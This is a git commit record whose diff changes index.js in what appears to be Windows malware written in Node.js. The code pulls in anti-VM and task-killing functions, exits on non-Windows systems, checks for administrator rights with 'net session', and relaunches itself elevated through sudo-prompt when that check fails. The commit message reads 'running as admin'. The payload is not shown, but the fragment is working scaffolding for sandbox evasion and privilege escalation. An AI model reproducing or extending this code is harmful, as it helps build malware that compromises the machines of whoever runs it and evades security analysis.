8ae3035bc1f7443650eef653b9af0fb982550681
Yuuto <thelio.trinite@outlook.com>
2023-04-05 18:19:57 +0200

    running as admin

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const { sep, join, resolve } = require('path');
 const { mkdtempSync } = require('fs');
 const os = require('os');
 const config = require('./config');
-const { spawnSync, execFileSync } = require('child_process');
+const { spawnSync, execSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 const sudo = require('sudo-prompt');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
@@ -11,7 +11,7 @@ spawnSync('explorer', [tempFolder]);
 
 if (os.platform() !== 'win32') process.exit();
 try {
-  execFileSync('net', ['session'], { 'stdio': 'ignore' });
+  execSync('net session');
 } catch (e) {
   sudo.exec(resolve(__filename));
 }
